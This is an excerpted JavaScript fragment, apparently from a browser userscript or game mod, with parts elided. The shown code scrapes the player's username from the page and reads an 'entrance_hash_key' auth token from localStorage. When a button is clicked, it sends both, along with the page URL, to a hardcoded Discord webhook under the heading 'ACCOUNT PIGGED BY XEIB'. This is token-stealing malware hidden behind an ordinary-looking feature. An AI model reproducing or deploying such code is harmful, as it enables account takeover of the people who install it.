...
function AABB() {
    ...
    if (component) {
        ...
        const AABB = getFunctionLength(AfterPhysics, 17)[0];
...
(function() {
    ...
    async function getUserInfo() {
        await sleep(15000);
        const textDecorationElements = document.querySelectorAll('.UserInfoContainerStyle-textDecoration');
        const textDecorations = Array.from(textDecorationElements).map(el => el.textContent.trim());
    ...
    function getKey() {
        try {
            key = localStorage.entrance_hash_key;
            return key || null;
        } catch (err) {
            return null;
        }
    ...
    const webhookUrl = 'https://discord.com/api/webhooks/1294772166835048561/VT0WqDA2NtiFUf9GQDjFuiHCe0vxzauhdJKcee4HVnThunUbuZQ12w68-pHSnCCgbdd8';

    button.addEventListener('click', async () => {
        const userInfo = await getUserInfo();
        const username = userInfo.textDecorations[0];

        if (key && username) {
            const message = {
                embeds: [
                    {
                        title: "ACCOUNT PIGGED BY XEIB",
                        description: `**Entrance Hash Key:** "${key}"\n**URL:** "${currentUrl}"\n**Username:** "${username}"`,
